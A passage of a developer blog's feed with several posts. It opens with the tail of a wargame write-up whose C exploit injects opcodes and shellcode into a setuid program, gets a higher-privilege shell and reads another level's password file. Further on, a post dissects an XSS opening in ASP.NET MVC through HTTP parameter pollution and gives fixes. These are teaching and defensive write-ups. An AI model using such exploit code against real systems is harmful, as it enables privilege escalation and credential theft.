</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="n">destination</span><span class="o">++</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">destination</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// calculate some offets and indexes</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">startInstructionAddress</span> <span class="o">=</span> <span class="n">instructionStartIndex</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">countAddress</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfIndex</span> <span class="o">=</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">printfAddress</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfInc</span> <span class="o">=</span> <span class="n">startInstructionAddress</span> <span class="o">-</span> <span class="n">printfValue</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">argBufSize</span> <span class="o">=</span> <span class="n">printfInc</span> <span class="o">+</span> <span class="n">movEaxEcx</span> <span class="o">+</span> <span class="n">incIncEcx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">movEcxEcx</span> <span class="o">+</span> <span class="n">jmpEcx</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cursor</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// allocate some memory for our command line arguments and null terminate it</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argBuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">argBufSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">argBuf</span><span class="p">[</span><span class="n">argBufSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// start by writing data required to point the printf entry to our location</span>
</span><span class='line'>  <span class="c1">// in the count array that contains our instructions</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">argBuf</span><span class="p">,</span> <span class="n">printfIndex</span><span class="p">,</span> <span class="n">printfInc</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// then write all our opcodes</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span><span class="p">,</span> <span class="n">movEaxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="n">movEcxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">jmpEcx</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Attempting to exploit, good luck!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// finally invoke the program, passing in the shell code and</span>
</span><span class='line'>  <span class="c1">// making sure that EAX contains 8 at the right time.</span>
</span><span class='line'>  <span class="n">execl</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x08</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argBuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">argBuf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Upload, compile and run the exploit and this is what happens:</p>

<figure class='code'><figcaption><span>Exploit Run </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/.oj<span class="nv">$ </span>./sploit
</span><span class='line'>Attempting to exploit, good luck!
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span>,1007<span class="o">(</span>level7<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&lt;&lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Game over! What a great challenge that was.</p>

<p>I&rsquo;d like to point out that this alternate level took me a <em>very long time</em> to nail. It was well worth the effort, and I learned a stack in the process.</p>

<p>Feedback is appreciated as always. Thanks for reading.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Irssi and SASL on OSX]]></title>
    <link href="http://buffered.io/posts/irssi-and-sasl-on-osx/"/>
    <updated>2013-02-03T08:37:00+10:00</updated>
    <id>http://buffered.io/posts/irssi-and-sasl-on-osx</id>
    <content type="html"><![CDATA[<p>Given my renewed focus on security I&rsquo;ve been looking to lock down much of my communications so that I <em>feel</em> more secure online. One of the things that I use quite a lot to connect with people who know WTF they&rsquo;re talking about is IRC. <a href="https://freenode.net/" title="Freenode IRC network">#freenode</a> is my network of choice as it has a bunch of interesting places with fairly active communities. <a href="http://www.irssi.org/" title="irssi IRC client">irssi</a> is my current client of choice for a few reasons.</p>

<p><a href="https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer" title="SASL">SASL</a>, among other things, is one thing that can be enabled to secure your communication on IRC. There&rsquo;s quite a bit of information out there already about how to <a href="https://freenode.net/sasl/sasl-irssi.shtml" title="Enabling SASL in irssi on Freenode">enable SASL for irssi on Freenode</a>. These instructions worked out of the box for me on Linux, but not on Mac OSX. After downloading <code>cap_sasl.pl</code> and putting it in <code>~/.irssi/scripts/autorun</code> and installing the required Perl modules I went through the steps to get SASL configured. When I attempted to enable it as per the instructions using the command <code>/sasl set network TheColonial &lt;password&gt; DH-BLOWFISH</code> I had the following error:</p>

<blockquote><p>Can&rsquo;t locate object method &ldquo;send_raw_now&rdquo; via package &ldquo;Irssi::Irc::Server&rdquo;</p></blockquote>

<p>This took a bit of Googling to nail. It turns out that, for some reason, on Mac OSX <code>irssi</code> actually requires an extra package to be included in the script. So open <code>cap_sasl.pl</code> and look for this (it&rsquo;s right at the top):</p>

<pre><code>use strict;
use Irssi;
</code></pre>

<p>Immediately below this, add the following:</p>

<pre><code>use Irssi::Irc;
</code></pre>

<p>The script should now run fine and <code>irssi</code> should stop complaining.</p>

<p>This might seem obvious to some, but it wasn&rsquo;t to me! From what I can tell other people around the traps have had the same problem so I thought I&rsquo;d post this in the hope that it helps others.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies]]></title>
    <link href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/"/>
    <updated>2012-11-29T20:50:00+10:00</updated>
    <id>http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies</id>
    <content type="html"><![CDATA[<p>Forgive the title of the post, it was hard coming up with something succinct that captured the purpose of the post. This was inspired by a recent experience with a client who had this exact problem with one of their production systems.</p>

<h2>TL;DR</h2>

<p>Never use <a href="http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx">Request.QueryString</a> to access parameters in your views, even when you&rsquo;re sure your actions have validated them. You may open your application up to <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> attacks. Always, <em>always</em> use data that is passed to your views via the <code>Model</code> or the <a href="http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx">ViewData</a> dictionary. Under no circumstances should you trust data coming in from the web, that includes query string parameters.</p>

<!--more-->


<h2>Setting the scene</h2>

<p>The application provided a certain function which allowed users to browse information tied to a number of entities. For the sake of this discussion let&rsquo;s say those entities were instances of a <strong>Person</strong>. The number of entities was extremely small, so it was decided that the interface would consist of a drop-down box consisting of all the entities. When that drop-down box was used a <em>change</em> event would fire using JavaScript that would modify the current URL and render a new page. That page would show the same drop-down list, with the appropriate entry selected, along with the information specfic to that entity.</p>

<p>Let&rsquo;s see some code starting with the &ldquo;details&rdquo; of the person:</p>

<figure class='code'><figcaption><span>Person.cs </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='csharp'><span class='line'><span class="k">public</span> <span class="k">class</span> <span class="nc">Person</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="kt">string</span> <span class="n">Name</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span><span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>    <span class="k">public</span> <span class="kt">int</span> <span class="n">Age</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Nothing too amazing there. Here&rsquo;s the parts of the page which renders the list of people:</p>

<figure class='code'><figcaption><span>Index.aspx (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Please choose a person <span class="err">&lt;</span>%= Html.DropDownList(&quot;people&quot;, Model) %&gt;
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">change</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;&lt;%= Url.Action(&quot;Detail&quot;, &quot;Person&quot;) %&gt;?index=&#39;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span><span class='line'>  <span class="p">});</span>
</span><span class='line'><span class="p">});</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, nothing too mind boggling here either. We can see how the <code>change</code> event fires and updates the <code>window.location</code> and moves the user to the <code>Details</code> page. The <code>Model</code> for this page is of type <code>IEnumerable&lt;SelectListItem&gt;</code>.</p>

<p>Next we&rsquo;ll take a look at the controller action which gets invoked when the drop-down is changed:</p>

<figure class='code'><figcaption><span>PersonController.cs (Partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='csharp'><span class='line'><span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">Detail</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nf">View</span><span class="p">(</span><span class="s">&quot;Detail&quot;</span><span class="p">,</span> <span class="n">Tuple</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">People</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">GetPeople</span><span class="p">()));</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re using the <code>index</code> parameter (note the <em>type</em> of this parameter, it&rsquo;s important) to index into the list of people we have stashed somewhere to extract the user that is being viewed. This person, along with the full list of people in <code>SelectListItem</code> form, is being passed to the view.</p>

<p>Let&rsquo;s see what the view does with this information:</p>

<figure class='code'><figcaption><span>Detail.aspx (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Please choose a person <span class="err">&lt;</span>%= Html.DropDownList(&quot;people&quot;, Model.Item2) %&gt;
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="o">&lt;%=</span> <span class="nx">Request</span><span class="p">.</span><span class="nx">QueryString</span><span class="p">[</span><span class="s2">&quot;index&quot;</span><span class="p">]</span> <span class="o">%&gt;</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#people&quot;</span><span class="p">).</span><span class="nx">change</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;&lt;%= Url.Action(&quot;Detail&quot;, &quot;Person&quot;) %&gt;?index=&#39;</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span><span class='line'>  <span class="p">});</span>
</span><span class='line'><span class="p">});</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span><span class='line'><span class="err">&lt;</span>%= Html.Encode(Model.Item1.Name) %&gt; is a whopping <span class="err">&lt;</span>%= Model.Item1.Age %&gt; years old!
</span><span class='line'><span class="nt">&lt;/p&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is starting to get a bit more interesting. The rendering of the drop-down is the same as before, except it&rsquo;s pulling data from the <a href="http://msdn.microsoft.com/en-us/library/system.tuple.aspx">System.Tuple</a> that was passed in as the <code>Model</code>. The event handler that&rsquo;s invoked on <code>change</code> is the same, and there&rsquo;s a bit of non-descript content rendering a the bottom. The subtle but important difference is the code that sets the currently selected person in the drop-down.</p>

<p>I plugged this code into a standard MVC application and this is what it looks like:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-index.png" title="'Choosing a person'" ></p>

<p>After selecting a person from the drop down it looks like this:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-details.png" title="'Person details'" ></p>

<h2>A bad assumption</h2>

<p>As you already know, ASP.NET MVC has the ability to automatically convert query string parameters into type-safe arguments that are passed into the controller actions. In the above example the <code>index</code> query string parameter is converted to an <code>int</code> and passed into the <code>Details</code> action. If a user attempts to modify this value to something that isn&rsquo;t an integer then MVC will literally poop itself, right?</p>

<p>Let&rsquo;s see.</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-type-fail.png" title="'Person details'" ></p>

<p>OK, so MVC will require that this value be an integer, otherwise the action will fail to be invoked. If that&rsquo;s the case, then the view won&rsquo;t be rendered and our code which directly accesses <code>Request.QueryString</code> will not be invoked and hence there&rsquo;s no risk.</p>

<p>Right?</p>

<p><a href="http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/">Wrong</a>.</p>

<h2>The attack vector</h2>

<p><a href="http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/">HTTP Parameter Pollution</a> is a relatively &ldquo;new&rdquo; problem which revolves around the way that web servers/applications parse and handle multiple instances of the same GET/POST parameter. Phew!</p>

<p>In other words, if a malicious user decides to pass in <em>another</em> instance of the <code>index</code> parameter in the query string, what happens? The way this is handled varies from technology to technology (see <a href="https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf">slide 9</a> for some examples), but here we&rsquo;re only interested in ASP.NET with IIS and MVC.</p>

<p>Let me just state this again: we&rsquo;re only interested in ASP.NET and IIS <em><strong>and MVC</strong></em>. The reason we need to emphasise this is because MVC rocks the boat a little bit. It&rsquo;s important to remember that <a href="http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx">Request.QueryString</a> is not specific to MVC, it&rsquo;s something that lives in ASP.NET land. <em>Controller actions</em> on the other hand are not available across the board when using ASP.NET, they live in MVC land. When it comes to binding query string parameters to controller action method parameters, MVC doesn&rsquo;t behave how you would expect, and it&rsquo;s not the same as what happens when dealing with <code>Request.QueryString</code> directly.</p>

<p>So what happens in ASP.NET and IIS <em>without</em> MVC if an attacker passes in two values for the same parameter? Consider the following url: <code>http://foo.com/bar?baz=0&amp;baz=dooby</code></p>

<p>While in C# land (remember, outside of MVC) <code>Request.QueryString["baz"]</code> will contain a string value <code>0,dooby</code>. In our current environment any duplicate instances of query string values are passed through as a single value joined together by commas. This knowledge is scarily uncommon. Many .NET developers that I know are not aware of this behaviour.</p>

<p>This is where MVC comes along and sprays poop over everything.</p>

<p>ASP.NET MVC controller action method parameter binding doesn&rsquo;t handle multiple instance of the same query string parameters in the same way. In fact, it behaves more like JSP on Jetty: <strong>it only uses the first value and ignores the rest</strong>.</p>

<p>Why is this bad? Well this means that code outside of controller actions may result in different behaviour to that which is inside. More importantly, accessing <code>Request.QueryString</code> to get access to a parameter doesn&rsquo;t mean that you&rsquo;ll get the same value as what was handled in the controller action.</p>

<p>Let&rsquo;s take a look at what might happen if we threw multiple instances via the query string at our dodgy MVC application:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-hpp-invalid.png" title="'HPP example'" ></p>

<p>The above screenshot shows both the query string and the page source when we do this. That&rsquo;s right, MVC used the first value, set to <code>0</code>, without any issues and invoked the view engine. The view&rsquo;s assumption that the <code>index</code> parameter has been sanitised by the controller has now been proven unsafe. Now we can see that we do have access to the source. Let&rsquo;s see what happens if we went a step further and passed in a more sinister value:</p>

<p><img src="http://buffered.io/uploads/2012/11/xss-hpp-valid.png" title="'HPP XSS exploit'" ></p>

<p>Pwned.</p>

<h2>Conclusion</h2>

<p><em>Never</em> trust unsanitised input, that includes stuff that gets passed in through <code>Request.QueryString</code>. Do not assume that the contents are safe just because your controller action handled things without throwing an exception. If you&rsquo;re going to render data that has come in from the user or from the query string, delegate responsibility of validation to the controller action and only trust content which is passed to the view via <a href="http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx">ViewData</a> or the <code>Model</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stepping Down]]></title>
    <link href="http://buffered.io/posts/stepping-down/"/>
    <updated>2012-11-27T21:46:00+10:00</updated>
    <id>http://buffered.io/posts/stepping-down</id>
    <content type="html"><![CDATA[<p>For the past two years I&rsquo;ve been heavily involved with organising two user groups in Brisbane: <a href="http://www.bfpg.org/">BFPG</a> and <a href="http://www.bnosql.com/">BNoSQL</a>. Those of you out there who organise your own user groups no doubt know how much is involved in keeping these things going. My focus has been on building communities around the subject matter and trying to get attendance up. It was a tough gig.</p>

<p>For the most part I think I succeeded in what I set out to achieve. We&rsquo;ve seen a steady growth in memberships along with the usual fluctuations in attendance, but on the whole the net effect has been really positive. The development community here in Brisbane is very strong and has a lot of passionate people backing it. I think it&rsquo;ll continue to grow and flourish.</p>

<p>During my time as an organiser I&rsquo;ve had an immense amount of fun, learned a bucketload, met some amazing people and formed some great friendships. But I&rsquo;ve got to a point where I think there&rsquo;s nothing more I can give to the groups as an organiser.</p>

<p>For groups to remain successful they need many things; the key one being <em>change</em>.</p>

<p>Organisers need to change. Focus needs to change. Ideas need to change. The group needs to get a fresh face periodically to stop it from stagnating. I feel that the time has come for me to step down as organiser and get other people to step up and make their mark, take the groups past where I can take them.</p>

<p>I also have personal reasons for making this decision and most of them revolve around the lack of time. I won&rsquo;t bore you with all the details, but for my own sanity I need a break from it. I need to step down before I burn out and lose the desire to attend in any capacity. I&rsquo;ve given it all I&rsquo;ve got and I hope that in some way I&rsquo;ve had a positive impact on the lives of the many techies that I know and respect here in sunny Brisbane.</p>

<p>As of the end of this year I will no longer be a user group organiser in Brisbane. At this point I have no plans to get back involved down the track, but I won&rsquo;t say &ldquo;never&rdquo; either. I&rsquo;ll be investing time in building up my own business, spending more time with the family and generally enjoying the lack of stress put on myself twice a month.</p>

<p>I want to thank this technical community for its support. It&rsquo;s been an absolute joy seeing people get together at the events that I&rsquo;ve helped create and I look forward to being part of the crowd from here on in.</p>

<p>Cheers!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Meaning]]></title>
    <link href="http://buffered.io/posts/meaning/"/>
    <updated>2012-10-30T23:32:00+10:00</updated>
    <id>http://buffered.io/posts/meaning</id>
    <content type="html"><![CDATA[<p>Life is way too short to be working on boring, uninteresting or meaningless stuff. Get out there and do what you love. Screw working for the dollar on something that you don&rsquo;t enjoy. Don&rsquo;t study in a field that doesn&rsquo;t inspire you just because you got the marks or because people expect you to. Don&rsquo;t do what you&rsquo;ve always done just because it&rsquo;s easy.</p>

<p>Chase your passion. <em>Love your work</em>.</p>

<p>Make sure you spend every day doing something that has meaning &hellip; something you feel is important and fulfilling. Remember, you&rsquo;re <strong>trading one whole day of your life for it</strong>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Webmachine, ErlyDTL and Riak - Part 5]]></title>
    <link href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-5/"/>
    <updated>2012-07-10T21:28:00+10:00</updated>
    <id>http://buffered.io/posts/webmachine-erlydtl-and-riak-part-5</id>
    <content type="html"><![CDATA[<p><img class="right" src="http://buffered.io/uploads/2010/09/riak-logo.png" title="'Riak Logo'" >Newcomers to the series should first take a look at the previous four parts of the <a href="http://buffered.io/series/web-development-with-erlang/" title="Web Development with Erlang">series</a> (<a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-1/" title="Wembachine, ErlyDTL and Riak - Part 1">Part 1</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-2/" title="Wembachine, ErlyDTL and Riak - Part 2">Part 2</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-3/" title="Wembachine, ErlyDTL and Riak - Part 3">Part 3</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4/" title="Wembachine, ErlyDTL and Riak - Part 4">Part 4</a>) first to make sure that you&rsquo;re up to speed. Feel free to read on if you feel comfortable with the general concepts in use.</p>

<p>When we finished <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4/" title="Wembachine, ErlyDTL and Riak - Part 4">Part 4</a> we were able to authenticate users using <a href="http://twitter.com/" title="Twitter">Twitter</a> and <a href="http://oauth.net/" title="OAuth">OAuth</a>, which is great as we can delegate the responsibility of password management to an external entity.</p>

<p>Now that we know who people are, we want them to be able to do something meaningful with their accounts. That&rsquo;s what this post is all about.</p>

<!--more-->


<h2><a id="agenda"></a>Agenda</h2>

<p>So far it has been hard to see what the goal of this application is. Given the piecemeal nature of the posts it&rsquo;s hard to project that vision, especially when the content is quite code-heavy. By the end of this post, we&rsquo;ll not only have a &ldquo;proper&rdquo; web application that performs useful functions, we&rsquo;ll be able to see what this &ldquo;Code Smackdown&rdquo; thing really is all about.</p>

<p>This post is going to cover the following topics:</p>

<ol>
<li><em><a href="http://www.basho.com/developers.html#Riak" title="Riak">Riak</a> Secondary Indexes</em> &ndash; We&rsquo;ll be using these so that we can link code snippet submissions to the users who submitted them.</li>
<li><em><a href="http://wiki.basho.com/MapReduce.html" title="Riak Map/Reduce">Map/Reduce</a></em> &ndash; We&rsquo;re going to end up with data stored in our database and we&rsquo;re going to want to query it. Map/reduce is where it&rsquo;s at!</li>
<li><em>Form submission handling with <a href="http://www.basho.com/developers.html#Webmachine" title="Webmachine">Webmachine</a></em> &ndash; Users will be able to submit code snippet pairs to the system once they&rsquo;re logged in. They&rsquo;ll also be able to vote on submitted snippets.</li>
<li><em>Listing of submissions per-user</em> &ndash; Viewing the submissions for a given user will pull out a list from Riak using the secondary indexes and map/reduce. This will allow a user to see what snippets they&rsquo;ve submitted.</li>
<li><em>Static file serving</em> &ndash; Our new UI will require the serving of static content. There are quite a few ways to do this, one of which is using a custom Webmachine resource. While in production it&rsquo;s a great idea to use a tool like <a href="http://nginx.org/" title="Nginx">Nginx</a> for this purpose, but we&rsquo;ll go with the custom Webmachine resource just to keep things a little simpler.</li>
<li><em>Tidying up of templates/UI</em> &ndash; Now that we&rsquo;ve got some content to render, we&rsquo;ll put together some nicer templates and harness <a href="http://twitter.github.com/bootstrap/" title="Twitter Bootstrap">Twitter Bootstrap</a> to make the site a little nicer to look at. You&rsquo;ll notice that the emphasis will drop off from <a href="http://github.com/evanmiller/erlydtl" title="ErlyDTL">ErlyDTL</a> as we&rsquo;ll be doing more rendering of content on the client side using <a href="http://handlebarsjs.com/" title="Handlebars templating">Handlebars</a> while using <a href="http://documentcloud.github.com/backbone/" title="Backbone.js">Backbone.js</a> for logic, routing and event handling.</li>
</ol>


<p>Lots of UI work has been done for this post, but most of that work will not be discussed in detail as there&rsquo;s already enough content to get through. As always the source code is available so you can read it and play with it. You&rsquo;ll find the link at the end of the post.</p>

<p>Prior to continuing you should make sure you have the latest version of <a href="http://www.basho.com/developers.html#Riak" title="Riak">Riak</a> installed. If you don&rsquo;t, please go and do this now (read <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-1/" title="Wembachine, ErlyDTL and Riak - Part 1">Part 1</a> to learn how to build Riak from scratch).</p>

<p>With that &hellip; don your robe and Wizard&rsquo;s hat and let&rsquo;s begin.</p>

<h2><a id="enabling-secondary-indexes"></a>Enabling Secondary Indexes</h2>

<p>As already mentioned we&rsquo;re going to be storing data in Riak and using the <a href="http://wiki.basho.com/Secondary-Indexes.html" title="Secondary Indexes in Riak">Secondary Index</a> feature to make it easier to link data together and do certain types of queries over that data. Given this requirement the first thing we should do is enable secondary indexes on our cluster.</p>

<p>As per the <a href="http://wiki.basho.com/Secondary-Indexes.html" title="Secondary Indexes in Riak">Riak wiki entry</a> &hellip;</p>

<blockquote><p>As of version 1.0, Secondary Indexes are enabled by configuring Riak to use the
ELevelDB backend <code>riak_kv_eleveldb_backend</code>. Currently, the ELevelDB backend is the
only index-capable backend.</p></blockquote>

<p>So we need to go through our Riak development cluster configuration and make sure that our backend is set up correctly. Before continuing, make sure your cluster is no longer running:</p>

